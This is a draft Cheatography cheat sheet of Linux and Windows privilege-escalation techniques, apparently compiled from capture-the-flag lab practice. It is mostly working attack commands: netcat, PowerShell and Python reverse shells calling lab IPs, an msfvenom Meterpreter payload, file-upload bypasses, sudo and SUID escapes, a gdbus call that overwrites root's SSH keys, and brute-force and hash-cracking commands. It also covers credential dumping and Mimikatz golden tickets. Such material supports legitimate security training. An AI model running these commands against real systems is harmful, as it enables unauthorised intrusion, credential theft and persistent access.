

    

1. [Home](https://cheatography.com/)>
2. [Programming](https://cheatography.com/programming/)>
3. [Security Cheat Sheets](https://cheatography.com/tag/security/)

# Linux | Windows Privilege Escalation Cheat Sheet   (DRAFT) by [blacklist_](http://www.cheatography.com/blacklist/)

Journey of getting a root.

This is a **draft** cheat sheet. It is a work in progress and is not finished yet.

### HTTP Status Codes

|     |     |
| --- | --- |
| Code (Gobuster) | Status |
| 2XX | **Success<br>{fa-bolt}} This class of status codes indicates the action requested by the client was received, understood and accepted. |
| 3XX | **Redirection<br>** This class of status code indicates the client must take additional action to complete the request. |
| 4XX | ** Client Error<br>** This class of status code is intended for situations in which the error seems to have been caused by the client. |
| 5xx | ** Server Error |

[https:­//w­ww.r­es­tap­itu­tor­ial.co­m/h­ttp­sta­tus­cod­es.html](https://www.restapitutorial.com/httpstatuscodes.html)

### Reverse Shell

|     |     |
| --- | --- |
| Usage | Syntax |
| Netcat | nc -e /bin/sh <ip­add> <po­rt> (target) |
|     | nc -lvp <po­rt> (host) |
| msfconsole | Power up metasploit |
| use exploi­t/<­pat­h> | specify exploit to use |
| show options | set the specific options |
| show target (set target no) | set the specific target like power shell, PHP, python |
| connect to rdp service using rdp client<br>Windows | 3389:RDP<br>**start Remmina to access then enter ip address then enter userna­me,­domain and password |
| ** Linux Privilege Escalation | **  **  **  ** |
| ** SUID binary | ** find / -perm -u=s -type f 2>/­­de­v­/null<br>** If you want to escalate privilege to another user search files that user owns there might be a cronjob that executes his file and we can place reverse shell<br>** find / -type d -group <us­er_­nam­e> 2>/­dev­/null/ |
| ** CronJobs | ** Trasnfer pspy64 through python server to find cronjobs |
| ** Sudo -l | ** It show you what exact command you are authorized to use |
| ** Suid binary Automation Script | ** SUID3N­UM.py ** Custom binary can be opened by reversing them using Ghidra |
| Add machine IP to /etc/hosts | ** echo 10.10.1­94.183 spooky­sec.local >> /etc/hosts |
| Cron Jobs (time-­based job scheduler) | ** Mostly we try to add our reverse shell into the file and CRON jobs executes the files and we get the reverse shell<br> ** We can even try to change etc/hosts if the cron is calling out to that IP we can change it and open a HTTP server on out machine and let him execute the script with our own reverse shell |
| Exploiting sudo -l | ** commands - /var/w­ww/gdb as www-data<br> ** escalate privilege to a user thirtytwo then<br> ** use GTFO ** sudo -u thirtytwo /var/w­ww/gdb -nx -ex '!sh' -ex quit |
| Exploiting sudo -l | ** (d4rckh) No paaswd: /usr/b­it/git<br>** We have a user who can exec commands on that path<br>** execute command to escalate<br>** sudo -u d4rckh /usr/b­in/git -p help config<br>** !/bin/sh |
| Escalate privilege via cronjob of a python script | **  [https:­//b­log.ra­zrs­ec.u­k/­try­hac­kme­-ta­rtarus/](https://blog.razrsec.uk/tryhackme-tartarus/) |
| Exploiting SUID | ** Find command which have SUID bit set which means we can run find as root user. Using -exec flag as shown above. Let’s try out by changing the permission of root directory.<br>** $ find . -exec chmod 777 /root \; |
| Linux privilege cheatsheet | **  [https:­//g­uid­e.o­ffs­ecn­ewb­ie.c­om­/pr­ivi­leg­e-e­sca­lat­ion­/li­nux­-pe­#cr­on-jobs](https://guide.offsecnewbie.com/privilege-escalation/linux-pe#cron-jobs)<br>** Hack tricks |

Upload tools and stuff - [https:­//p­run­e20­00.g­it­hub.io­/po­st/­upl­oad­-tools/](https://prune2000.github.io/post/upload-tools/)

[http:/­/pe­nte­stm­onk­ey.n­et­/ch­eat­-sh­eet­/sh­ell­s/r­eve­rse­-sh­ell­-ch­eat­-sheet](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)

### Cyber Kill Chain

|     |     |
| --- | --- |
| Usage | Syntax |
| View Source Code | Read it (enume­rat­ion­/di­rec­tory) {{fa-bolt}<br>Read hints Carefully and use find and locate command |
| Gobuster | Dirb buster |
| Nmap Scan | -A (aggre­ssive) -p- (all ports) |
| Stegan­ography | [https:­//0­xri­ck.g­it­hub.io­/li­sts­/stego/](https://0xrick.github.io/lists/stego/) |
| Ftp | Penetr­ation testing of ftp port.{{fa-bolt}<br>It can be brute forced using hydra. {{fa-bolt}<br>ftp <ip­add­r> to connect and <ge­t> files. |
| Think like an hacker | What can i do from here<br> **Where can i look (any hints given) |
| Common Userna­me/­Pas­sword | admin:­admin admin:­pas­sword root:p­assword root:root and admin:­fil­eserver |
| Web shell | ** Provides us to enable with remote admini­str­ation on the target server<br>** We can add or modify some data (deface it) as a webadmin. So after we get the web site admin access, our aim is to get web server access. |
| Inform­ation Gathering | ** Search the website if it has blog post with names that can be used. Try to gather inform­ation and think how it can be used<br> ** Try to think if you require a email what info can be used to fetch a name or format on how email is being used such as using inital­s@d­oma­in_name |
| Directory Enumer­ation Wordlists | ** Dirbuster medium ** Dirb common ** rockyou |
| Steghide and Binwalk | Binwalk is used on png and Steghide is used on jpg<br>A png image can be used to hide binary files like zip whereas jpg image can be used to hide a text file |
| Identify hash | hashid 'hash' and ciphey tool |
| Terminate hashcat session | rm -rf ~/.has­hca­t/s­ess­ion­s/h­ash­cat.pid |
| Nmap script scans | nmap -sV -A --script vuln <ip> |
| JWT CRACK | hashcat -a 0 -m 16500 crack.txt /rockyou |
| HTTP running | ** dirb ** try HTTPS/­/<i­p> ** robots.txt ** Page source |
| Wordpress | **  [https:­//w­ww.h­ac­kin­gar­tic­les.in­/wp­sca­nwo­rdp­res­s-p­ent­est­ing­-fr­ame­work/](https://www.hackingarticles.in/wpscanwordpress-pentesting-framework/)<br>**  [https:­//b­log.wp­sca­n.o­rg/­ass­ets­/po­sts­/wp­sca­n-p­ost­ers­/WP­Sca­n_C­LI_­Che­at_­She­et.pdf](https://blog.wpscan.org/assets/posts/wpscan-posters/WPScan_CLI_Cheat_Sheet.pdf) |
| Wordpress - get reverse shell | ** Username enumer­ation ** Brute force Password ** Login and upload shell to get session<br>** To upload PHP shell either upload it as a PLUGIN or Edit Theme, exploitDB - PHP plugin , MSF - PHP/re­ver­se_tcp and PHP reverse shell can be uploaded<br>**  [https:­//w­ww.h­ac­kin­gar­tic­les.in­/wo­rdp­res­s-r­eve­rse­-shell/](https://www.hackingarticles.in/wordpress-reverse-shell/) |
| Bypass File Upload | ** Download PHP pentest monkey rev shell<br>** rev shell with GIF89a on top<br>** Now change extension<br>** Upload it but wont execute<br>** Now upload again and intercept<br>** Intercept through Burp<br>** Edit the request and change that file to .gif.php<br>** Done just execute the shell through PATH<br>** Use nc to capture the connection |
| Spot DBus in SUID files | ** Execute this command to replace replace current user .ssh private ket to root .ssh private key so we can login in ssh as root<br>** gdbus call --system --dest com.ub­unt­u.U­SBC­reator --obje­ct-path /com/u­bun­tu/­USB­Creator --method com.ub­unt­u.U­SBC­rea­tor.Image /home/­nad­av/­aut­hor­ize­d_keys /root/.ss­h/a­uth­ori­zed­_keys true<br>** If we get ( ) as reply, it executed system call |
| DBus | ** dbus is message bus system for usb controller<br>** basically send message of buses from one bus to another<br>** If current user has SUID on DBUS it means that they have executable rights over that command |
| File Upload Bypass & Pentest Monkey Shell | **https://github.com/strawp/web-shells<br>** Hacktricks bypass file upload |

Linux Escalation Techniques -> [http:/­/xi­phi­asi­lve­r.n­et/­201­8/0­4/2­6/a­nno­tat­ion­-ab­usi­ng-­sud­o-l­inu­x-p­riv­ile­ge-­esc­ala­tio­n/#­dis­qus­_thread](http://xiphiasilver.net/2018/04/26/annotation-abusing-sudo-linux-privilege-escalation/#disqus_thread)

Web enumer­ation -> [https:­//b­erz­erk­0.g­ith­ub.i­o/­Git­Pag­e/C­TF-­Wri­teu­ps/­Opt­imu­m-H­TB.html](https://berzerk0.github.io/GitPage/CTF-Writeups/Optimum-HTB.html)

### Cyber Kill Chain (Windows)

|     |     |
| --- | --- |
| Usage | Syntax |
| Nmap -> Service Enumer­ation | The services running helps us in identi­fying our next steps<br> ** Kerberos was running on port 88 so we could launch a Kerberos pre authen­tic­ation attack<br> ** If many services are running try enum4linux<br> ** Website upload shell and access it |
| nmap -sV --scri­pt=­nfs­-sh­owmount <ta­rge­t> | ** Nmap script scan and Nmap scan ** 2049 (port no) |
| NFS (mount the drive to access it) | ** Network File System permits a user on a client machine to mount the shared files or direct­ories over a network.<br> ** showmount -e <ta­rge­t> |
| Mount the content of shared folder -t (type) nfs/iso | mount -t nfs ip:/dr­ive­_name /mnt/f­old­er_name<br> ** There is a possib­ility to access the root folder by :/ and then navigate to other folder such as root<br> ** There is a way to detach a busy device immedi­ately #umount -l and then delete the contents |
| Google where does CMS (umbraco) store creden­tials | ** Appdat­a/.sdf file extension normally contain standard database files that store data in a structured file format.<br> ** cat Umbrac­o.sdf \| grep admin |
| Hashcat to crack password hash | ** hashcat -a 0 -m 100 crack.hash /usr/s­har­e/w­ord­lis­ts/­roc­kyo­u.txt |
| Whenever you get interface try to find upload panel | ** Upload reverse shell then browse the directory to execute it on the remote machine to get a reverse shell |
| Windows reverse shell payload | ** msfvenom -p window­s/m­ete­rpr­ete­r/r­eve­rse_tcp LHOST=­10.1­0.1­4.89 LPORT=4455 -f exe > blackl­ist.exe<br> ** Upload it |
| C:/Inetpub (cve browse to access payoad) 'ls C:/' | ** Inetpub is the folder on a computer that is the default folder for Microsoft Internet Inform­ation Services (IIS). The website content and web apps are stored in the inetpub folder — which keeps it organized and secure. |
| Access the payload | ** python exploit.py -u [admin@­htb.local](https://cheatography.com/mailto:admin@htb.local) -p bacona­ndc­heese -i 'http:­//1­0.1­0.1­0.180' -c powers­hel­l.exe -a 'C:/in­etp­ub/­www­roo­t/m­edi­a/1­034­/bl­ack­lis­t.exe' |
| Listen for connection | ** use exploi­t/m­ult­i/h­andler<br> ** set payload payloa­d/w­ind­ows­/x6­4/s­hel­l_r­eve­rse_tcp |
| Upload Winpeas and access using CVE | ** Privilege Escalation Awesome Scripts |
| winPEAS | ** Applic­ation area we can see Teamviewer and check it using shell<br> ** Use metasploit to gain access to creden­tials<br> ** s run post/w­ind­ows­/ga­the­r/c­red­ent­ial­s/t­eam­vie­wer­_pa­sswords |
| Evil-Winrm : Winrm Pentesting Framework | ** PS Remote shell hacking tool named as “Evil-­Winrm”. So we can say that it could be used in a post-e­xpl­oit­ation hackin­g/p­ent­esting phase.<br> ** The purpose of this program is to provide nice and easy-t­o-use features for hacking. |
| Evil Winrm | evil-winrm -u Admini­strator -p '!R3m0te!' -i '10.10.10.180' |
| Enum4linux | ** Enum4linux is an enumer­ation tool capable of detecting and extracting data from Windows and Linux operating systems, including those that are Samba (SMB) hosts on a network. Enum4linux is capable of discov­ering the following: Password policies on a target, The operating system of a remote target, Shares on a device (drives and folders), Domain and group member­ship, User listings |
| GetNPUUser (impacket script) | ** getnpu­use­rs.py <do­mai­n_n­ame­>/ -dc-ip <ip><br> ** getNPU­use­rs.py - Get users password hashes, Supported in Kerberos protocol, Disable Kerberos pre-auth it becomes vulner­able, username and password are optional, Use this script to identify vulnerable accounts |
| Domain Controller , Active Directory | ** A Windows Domain allows management of large computer networks<br> ** They use a Windows server called a DC (domain contro­ller)<br> ** A DC is any server that has Active Directory domain services role<br> ** DC respond to authen­tic­ation requests across the domain<br> ** DCs have the tool AD (active directory) and GP (group policy)<br> ** AD contains objects and OUs (Organ­iza­tional Units)<br> ** GP contains GPOs (Group Policy objects) that manage settings for AD objects |
| Kerberos Cheatsheet | [https:­//g­ist.gi­thu­b.c­om/­Tar­log­icS­ecu­rit­y/2­f22­192­4fe­f8c­14a­1d8­e29­f3c­b5c5c4a](https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a) |
| SMB (netbi­os-sn) | SMB ports are open. We need to do the usual tasks: check for anonymous login, list shares and check permis­sions on shares.<br> ** |
| SMB enumer­ation | smbclient -L ip and access smbclient //192.1­68.1.1­08­/sh­are­_name |
| Notes in Kali | Windows Priv. Esc. |

[https:­//g­ith­ub.c­om­/ca­rlo­spo­lop­/pr­ivi­leg­e-e­sca­lat­ion­-aw­eso­me-­scr­ipt­s-suite](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite)

[https:­//b­ook.ha­ckt­ric­ks.x­yz­/wi­ndo­ws/­act­ive­-di­rec­tor­y-m­eth­odology](https://book.hacktricks.xyz/windows/active-directory-methodology)

### Linux Directory Structure

|     |     |
| --- | --- |
| Directory Name | Usage |
| /var | /var contains things that are prone to change, such as websites, temporary files, config and databases |
| /bin | /bin contains execut­ables which are required by the system for emergency repairs, booting, and single user mode. |
| /usr/bin | /usr/bin contains any binaries that aren't required. |

### Windows cmd commands

|     |     |
| --- | --- |
| Discover users | ** net user |
| Read text file | ** type root.txt |
| list directory content | ** dir |
| Change directory | ** cd |
| Read file permission and owner | ** Right click > Properties > Details > Owner ** Goto security tab > edit permission > Add > enter the name of user you want to give permission |
| Upgrade Command Shell to Meterp­reter | sessions -u <no> or use use post/m­ult­i/m­ana­ge/­she­ll_­to_­met­erp­reter |
| Metasploit get hashes of users | hashdump |

### Linux Commands

|     |     |
| --- | --- |
| Command Name | Syntax |
| Vim Text Editor | ** i for insert ** esc to exit insert ** :wq to quit and save |
| Hashcat (crack password hash) | ** hashcat -a 0 -m 500 hash /root/Downloads/rockyou.txt --force |
| Scp (secure copy files) | ** Want to receive files from target<br> ** scp userna­me@­rem­ote­:/f­ile­/to­/send /where­/to/put |
| Base64 (move files) | ** base64 <fi­len­ame><br> ** Save the encoding in a file<br> ** base64 -d <fi­len­ame­_ba­se6­4_e­nco­din­g> |
| Gobuster (dir buster) | ** gobuster dir -u http://10.10.203.157:3333/ -w /usr/share/wordlists/dirb/common.txt |
| Processes running (under which user) | ps aux |
| SUID (set owner userId upon execution) binary | find / -perm -u=s -type f 2>/­dev­/null<br>Instead of rwx -> rws. Example - the suid bit is set on binary file password as other user should be able to change their password but the user wont have direct access to that file<br>So it has root privileges |
| Burp Suite (check acceptable file ext) | By sending request to Intruder and then spider attack ** Check response length to verify if the extension is acceptable or not<br>Python script by importing request library can also be used |
| Word count (count the no of lines in a file) | wc -l yourTe­xtFile |
| Whatweb | whatweb <ip><br>The WhatWeb tool is used to identify different web techno­logies used by the website. |
| Fim (view images from terminal) | fim <im­age­_name) |
| Curl (change user agent (browser type render content) and follow redire­ction) | curl -A "­J" -L "­htt­p:/­/10.10.23­1.1­16" |
| Python server to transfer files from remote to local | python3 -m http.s­erver <po­rt_­no> and access using the ip of remote machin­e:port no |
| Python server to transfer files from local to remote | wget http:/­/<u­r-i­p>:­<po­rt>­/<f­ile> |
| Extract zip | 7z e <zi­p_n­ame.zi­p> |
| Crack Zip | locate zip2john<br>zip2john <zi­pfi­le> > output.txt<br>john output.txt |
| Move multiple to directory | mv file1 file2 folder­_name |
| Fuzz directory | wfuzz -c -w common.txt --sc 200 -u "­htt­p:/­/10.10.10.19­1/F­UZZ.tx­t" -t 100 |
| Find flags .txt | find / -type f -name 'user.txt' 2>/­dev­/null |
| Hydra (brute force http post form) | hydra -L userna­mes.txt -P passwo­rds.txt 192.16­8.2.62 http-p­ost­-form “/dvwa­/lo­gin.ph­p:u­ser­nam­e=­USE­R&pa­ssw­ord­=P­ASS­&­Log­in=­Log­in:­Login Failed”<br> ** Specify the error at login failed |
| Hydra (brute force FTP) | hydra -l ftpuser -P passlist [ftp://­10.1­0.5­0.55](https://cheatography.com/ftp://10.10.50.55/) |
| FTP bruteforce | hydra -l chris -P /usr/s­har­e/w­ord­lis­ts/­roc­kyo­u.txt -vV [ftp://­10.1­0.9­1.104](https://cheatography.com/ftp://10.10.91.104/) |
| POP3 bruteforce | ** hydra -l "­bor­is" -P /usr/s­har­e/w­ord­lis­ts/­fas­ttr­ack.txt -f 10.10.1­86.225 -s 55007 pop3 -V |
| John the ripper (crack ssh) VIA (private key pass brutef­orce) | ** python /usr/s­har­e/j­ohn­/ss­h2j­ohn.py codes > crack.txt<br> ** john --word­lis­t=/­roo­t/D­own­loa­ds/­roc­kyo­u.txt crack.txt |
| ssh (login through private key) | ** ssh -i codes [david@­10.1­0.1­0.165](https://cheatography.com/mailto:david@10.10.10.165) -p 22 |
| SSH bruteforce for password | ** hydra -f -l john -P list [ssh://­10.1­0.2­4.200](https://cheatography.com/ssh://10.10.24.200) |
| Bruteforce JPG for hidden data (steghide pass) | ** stegcr­acker file list.txt |
| TELNET intera­cting with POP3 | ** Connect to the mail server using Telnet with the IP or DNS name of the server on port 110<br>**  [TELNET commands](https://www.vircom.com/blog/quick-guide-of-pop3-command-line-to-type-in-telnet/) |

[https:­//m­zfr.gi­thu­b.i­o/l­inu­x-p­riv-esc](https://mzfr.github.io/linux-priv-esc)

[https:­//l­inu­xiz­e.c­om/­pos­t/h­ow-­to-­use­-li­nux­-ft­p-c­omm­and­-to­-tr­ans­fer­-files/](https://linuxize.com/post/how-to-use-linux-ftp-command-to-transfer-files/)

[https:­//w­ww.h­os­tin­gma­nua­l.n­et/­zip­pin­g-u­nzi­ppi­ng-­fil­es-­unix/](https://www.hostingmanual.net/zipping-unzipping-files-unix/)

### Enumer­ation

|     |     |
| --- | --- |
| Usage | Syntax |
| Upgrading a Simple Shells to Fully Intera­ctive | python -c 'import pty; pty.spawn("/bin/sh")' |
| Enumer­ation Scripts | LinEnum, Linpeas, Jalesc, pspy64 or pspy32 |
|     | [https:­//g­ith­ub.c­om­/it­sKi­ndr­ed/­jalesc/](https://github.com/itsKindred/jalesc/) |
| Sqlmap to perform enumer­ation (Banner Grabbing) | Capture burp request and test it on Login forms<br>Command: sqlmap -r .txt file_name --dbs |
|     | The output comes up with the list of databases in the remote server.<br> [https:­//w­ww.n­et­spa­rke­r.c­om/­blo­g/w­eb-­sec­uri­ty/­sql­-in­jec­tio­n-c­hea­t-s­heet/](https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/) |
| Attention to detail | Is something wrong like text at the end<br>Everything makes sense like password |
| Cipher Identifier and Analyzer | [https:­//w­ww.b­ox­ent­riq.co­m/c­ode­-br­eak­ing­/ci­phe­r-i­den­tifier](https://www.boxentriq.com/code-breaking/cipher-identifier) |
| Password Hash Cracker | [https:­//c­rac­kst­ati­on.net/](https://crackstation.net/) |
| Vigenere cipher (Long text vulner­able) | [https:­//w­ww.g­ub­all­a.d­e/v­ige­ner­e-s­olver](https://www.guballa.de/vigenere-solver) |
| All in one Decoder | [https:­//g­chq.gi­thu­b.i­o/C­ybe­rChef/](https://gchq.github.io/CyberChef/) |
| Cipher and Hash identi­fic­ation | ** ASCII RANGE 60-120<br>** Decimal and Binary<br>** Base64 number and upper and lower case<br>** MD5 lower case numbers and 32 in length |
| Find files with common extension | find / -name *.txt 2>/­dev­/null |
| Hashcat | ** The crypt formats all have a prefix<br>** $1$ is md5crypt, $2$ is bcrypt, $5$ is sha256­crypt, $6$ is sha512­crypt<br>** Ciphey tool and hashcat wiki |
| Etc/Shadow File | ** Unders­tanding the /etc/s­hadow File<br>**  [https:­//l­inu­xiz­e.c­om/­pos­t/e­tc-­sha­dow­-file/](https://linuxize.com/post/etc-shadow-file/) |
| CMS | ** Hunt for admin panel ** Aim for Usernames and Password** Always read source, https , robots and dirb<br>** Always study that CMS like upload path |
| LFI | ** If you find paramter /index.ph­p?plot=<br>** Try Fuzzing manually or Burp |
| Netstat on the victim machine | ** To view incoming and outgoing connection and might find a port not coming up in scan |
| HTTP | ** https ** robots.txt ** source ** directory enum ** vulner­ability like LFI , SQL. Every vulner­ability has its indicators |
| FTP | ** brute force ** cve cd... ** ls -al ** |
| THM Crypto­graphy Room - RSA tool | **  [link text](https://github.com/Ganapati/RsaCtfTool)<br>** PGP stands for Pretty Good Privacy. It’s a software that implements encryption for encrypting files, performing digital signing and more. and Similarly we have GPG open source and you can decrypt a file using gpg |
| Service Enumer­ation | ** Enumerate the service<br>** Find login page like directory path for that service<br>** like where is the login page located<br>** Checkout Youtube and others for exploiting that service |
| Another tip for service enum | ** Most of privilege escalation to users after www-data is through hash or some given pass, enumerate files of that service like where is the database files stored inside this service or where is the users info stored in that service |
| Copy all files into a single file | ** cat * > blackl­ist.txt |

Enumer­ation and Unders­tanding of the scenario are very important aspects.

Think if you need something like creden­tials is there any way to access them from current options available.

**CRED­ENT­IALS**

### GTFOBins

|     |     |
| --- | --- |
| Usage | Syntax |
| Vim Text Editor | [https:­//g­tfo­bin­s.g­ith­ub.i­o/­gtf­obi­ns/vim/](https://gtfobins.github.io/gtfobins/vim/) |
| Service Exploi­tation | ** Exploiting any service which is running as root<br>** Also provide the file path to the service's executable |
| To exploit a service | Execute it for example <pa­th_­to_­the­_se­rvi­ce>­-><br>** /usr/b­in/sudo /usr/b­in/­jou­rnalctl -n5 -unost­rom­o.s­ervice<br>** You can get this from GTFObins but need to find out path |
| /systemctl (suid but set) | **service is an "­hig­h-l­eve­l" command used for start, restart, stop and status services in different Unixes and Linuxes.<br>** Service is adequate for basic service manage­ment, while directly calling systemctl give greater control options.<br>** Our target system allows any logged in user to create a system service and run it as root! |
| Sudo -l | sudo -l show you what exact command you are authorized to use |
| (ALL, !root) NOPASSWD: /usr/b­in/vi | The !root is a cve vulner­ability which can be exploited through<br>** sudo -u#-1 <pa­th_­whe­re_­use­r_c­an_­exe­cut­e_s­udo­_co­mma­nd> |
| If sudo - l specifies Vim | ** Use esc and then :! as we are going to type a system command and then we specify executable sh (:!sh) |

GTFOBins is a curated list of Unix binaries that can be exploited by an attacker to bypass local security restri­ctions.

The project collects legitimate functions of Unix binaries that can be abused to break out restricted shells, escalate or maintain elevated privil­eges, transfer files, spawn bind and reverse shells, and facilitate the other post-e­xpl­oit­ation tasks.

### Windows Enumer­ation

|     |     |
| --- | --- |
| Command | Usage |
| Biggest Enumer­ation Hint | ** his is going to sound like.im being dising­enuous, but you need to learn how to figure things out. Each machine might require a tool you haven't even heard of yet, but you have to figure that part out. Knowing what and how to Google is arguably the most valuable skill. |
| Hint - Users | ** names are impotant! might be subdomain or read understand might be username passwd |
| Hint - Finding the right file | ** The service at the starting off the box can be later on checked for conf or file for username passwd |
| Github - working | ** Create branch ** Now push file into that branch ** Click on the uploaded file and PULL request ** Complete pull request is same as Commit ** Approve and Complete the Merge |
| Active Directory | ** TryHackMe Room ** A Windows Domain allows management of large computer networks ** They use a Windows server called a DC (domain contro­ller) ** A DC is any server that has Active Directory domain services role ** DC respond to authen­tic­ation requests across the domain ** DCs have the tool AD (active directory) and GP (group policy) ** AD contains objects and OUs (Organ­iza­tional Units) ** GP contains GPOs (Group Policy objects) that manage settings for AD objects |
| Netbios port 137 | ** Hacktrick enumer­ation |
| SMB port 139 | ** smbclient -L <ip> - yields inform­ation such as sharename and its type |
| SVN PORT NO - 3690 and its simply Version Tracking With Subversion (SVN) | ** First view the log ** svn log [svn://­wor­ker.htb/](https://cheatography.com/svn://worker.htb/)<br> ** Now you can view the difference between those commits ** svn diff svn://htb/ -r 2 |
| Subversion Commands | [http:/­/ww­w.y­oli­nux.co­m/T­UTO­RIA­LS/­Sub­ver­sio­n.h­tml­#SV­NPR­OPE­RTIES](http://www.yolinux.com/TUTORIALS/Subversion.html#SVNPROPERTIES) |
| SVN | ** Subversion cannot find a proper .svn directory in there. |
| Reverse shells | [https:­//h­ack­ers­int­erv­iew.co­m/o­scp­/re­ver­se-­she­ll-­one­-li­ner­s-o­scp­-ch­eat­sheet/](https://hackersinterview.com/oscp/reverse-shell-one-liners-oscp-cheatsheet/) |
| Powershell reverse shell | powershell -nop -c "­$client = New-Object System.Ne­t.S­ock­ets.TC­PCl­ien­t('­192.16­8.1.2'­,44­44)­;$s­tream = $clien­t.G­etS­tre­am(­);[­byt­e[]­]$bytes = 0..655­35\|­%{0­};w­hil­e(($i = $strea­m.R­ead­($b­ytes, 0, $bytes.Le­ngth)) -ne 0){;$data = (New-O­bject -TypeName System.Te­xt.A­SC­IIE­nco­din­g).G­et­Str­ing­($b­ytes,0, $i);$s­endback = (iex $data 2>&1 \| Out-String );$sen­dback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sen­dbyte = ([text.en­cod­ing­]::­ASC­II).Ge­tBy­tes­($s­end­bac­k2)­;$s­tre­am.W­ri­te(­$se­ndb­yte­,0,­$se­ndb­yte.Le­ngt­h);­$st­rea­m.F­lus­h()­};$­cli­ent.Cl­ose­()" |
| Windows intera­ctive shell (ASPX Shell by LT) | [https:­//g­ith­ub.c­om­/xl­7de­v/W­ebS­hel­l/b­lob­/ma­ste­r/A­spx­/AS­PX%­20S­hel­l.aspx](https://github.com/xl7dev/WebShell/blob/master/Aspx/ASPX%20Shell.aspx) |

### Windows Priv. Esc. || Metasploit Module

Name
Usage
Microsoft Remote Desktop (MSRDP)
Port no - 3389
Local Security Authority Subsystem Service
** lsass service
** The service respon­sible for authen­tic­ation within Windows.

** We generally infect a process with the migrate command in metasploit to infect a process that can commun­icate with lsass.exe and has permis­sions that are needed to interact

To exploit lsass we need to be **Same archit­ecture (living in) ** Same permis­sions

**In order to interact with lsass we need to be 'living in' a process that is the same archit­ecture as the lsass service (x64 in the case of this machine) and a process that has the same permis­sions as lsass.

Printer service
**spoolsv.exe
** The printer spool service
Living in as a process

** Often when we take over a running program we ultimately load another shared library into the program (a dll) which includes our malicious code. From this, we can spawn a new thread that hosts our shell.

msfconsole >> search <Pr­ogr­am/­Pro­ces­s>

Fire up msfconsole terminal and search for vulnerable exploit of a program or process

Select a exploit

** Select using #use <no>** Remeber to use #search options command and set them accord­ingly

Fire the exploit
**#run them after setting up options
Metasploit command center
**#getuid (user-id)**#sysinfo **#getprivs **#migrate -N PROCES­S_NAME
Local_­exploit V/S Remote­_ex­ploit

** A remote exploit works over a network and exploits the security vulner­ability without any prior access to the vulnerable system. A local exploit requires prior access to the vulnerable system and usually increases the privileges of the person running the exploit past those granted by the system admini­str­ator.

Local_­exploit (metas­ploit)
**run post/m­ult­i/r­eco­n/l­oca­l_e­xpl­oit­_su­ggester
** Results for potential escalation exploits.
** Local exploits require a session to be selected
Background a session (some privil­edge)
**#background

** This provides us with a session number which can be used in combin­ation with another exploit to escalate privil­edges

Mimikatz (password dumping tool)

**#load kiwi (Kiwi is the updated version of Mimikatz) [object Object] (Kiwi is the updated version of Mimikatz)

** Expanded the options use #help to view them

Mimikatz allows us to create what's called a [object Object], allowing us to authen­ticate anywhere with ease.

**golden_ticket_create

**Golden ticket attacks are a function within Mimikatz which abuses a component to Kerberos (the authen­tic­ation system in Windows domains), the ticket­-gr­anting ticket. In short, golden ticket attacks allow us to maintain persis­tence and authen­ticate as any user on the domain.

Windows NTLM hash crack
hashcat -a 0 -m 1000 crack.hash /usr/s­har­e/w­ord­lis­ts/­roc­kyo­u.txt

### Privilege escalation

|     |     |
| --- | --- |
| Usage | Syntax |
| C program | make <.c progra­m> then ./ to execute |
| SCP (secure copy files) from local to remote machine | scp <fi­len­ame> userna­me@­ip:­<lo­cat­ion> |
| Python server | ** python3 -m http.s­erver |
| Unix info about your specific Linux distri­bution | ** lsb_re­lease -a ** uname -a |
| Use echo " text " into file | ** echo "­tex­t" > output.txt |
| Python reverse shell with newline char | ** python -c 'import socket­,su­bpr­oce­ss,­os;­s=s­ock­et.s­oc­ket­(so­cke­t.A­F_I­NET­,so­cke­t.S­OCK­_ST­REA­M);­s.c­onn­ect­(("1­0.1­0.1­4.1­57",­123­5))­;os.du­p2(­s.f­ile­no(­),0); os.dup­2(s.fi­len­o(),1); os.dup­2(s.fi­len­o()­,2)­;p=­sub­pro­ces­s.c­all­(["/­bin­/sh­"­,"-i­"]);' |
| View Cronjobs | ** cat /etc/c­rontabs |
| Exploiting sudo -l user NOPASSWD: ALL | ** sudo -i -u <us­er> |
| Sudo knowledge | ** su asks for the password of the user "­roo­t".<br>** sudo asks for your own password (and also checks if you're allowed to run commands as root, which is configured through /etc/s­udoers -- by default all user accounts that belong to the "­adm­in" or "­sud­o" groups are allowed to use sudo).<br>** sudo -s launches a shell as root, but doesn't change your working directory. sudo -i simulates a login into the root account: your working directory will be /root, and root's .profile etc. will be sourced as if on login. |
| Sudo -l (explo­iting sudo rights) | ** Super User Do root privilege task<br>**  [https:­//w­ww.h­ac­kin­gar­tic­les.in­/li­nux­-pr­ivi­leg­e-e­sca­lat­ion­-us­ing­-ex­plo­iti­ng-­sud­o-r­ights/](https://www.hackingarticles.in/linux-privilege-escalation-using-exploiting-sudo-rights/) |
| After SSH | ** |
| id  | ** id command in Linux is used to find out user and group names and numeric ID's (UID or group ID) of the current user or any other user in the server |
| id shows 108(lxd) | **  [LXD privilege escalation](https://www.hackingarticles.in/lxd-privilege-escalation/) |
| Weak File Permission | ls -l <fi­le> : Check Permis­sions |
| Readable /etc/s­hadow | ** Crack the passwd, SHA-512 |
| Writeable /etc/s­hadow | ** Create and replace the passwd, mkpasswd -m sha-512 newpas­swo­rdhere |
| Writeable /etc/p­asswd | ** Create and replace the passwd, openssl passwd newpas­swo­rdhere |

 **  [linux](https://cheatography.com/tag/linux/)     **  [windows](https://cheatography.com/tag/windows/)     **  [root](https://cheatography.com/tag/root/)     **  [hacking](https://cheatography.com/tag/hacking/)     **  [escalation](https://cheatography.com/tag/escalation/)     **  [priviledge](https://cheatography.com/tag/priviledge/)     **  [priv](https://cheatography.com/tag/priv/)     **  [esec](https://cheatography.com/tag/esec/)

### How's Your Readability?

Cheatography is sponsored by **[Readable.com](https://readable.com/)**. Check out Readable to make your content and copy more engaging and support Cheatography!

[Measure Your Readability Now!](https://readable.com/text/)

**

## Download the Linux | Windows Privilege Escalation Cheat Sheet

[[blacklist_linux-windows-privilege-escalation.750.webp](../_resources/785f66b9eef20882ef618814b8f03e99.webp)13 Pages](https://cheatography.com/#)

**PDF** (recommended)

- **  [PDF (13 pages)](https://cheatography.com/blacklist/cheat-sheets/linux-windows-privilege-escalation/pdf/)

**Alternative Downloads**

- **  [PDF (black and white)](https://cheatography.com/blacklist/cheat-sheets/linux-windows-privilege-escalation/pdf_bw/)
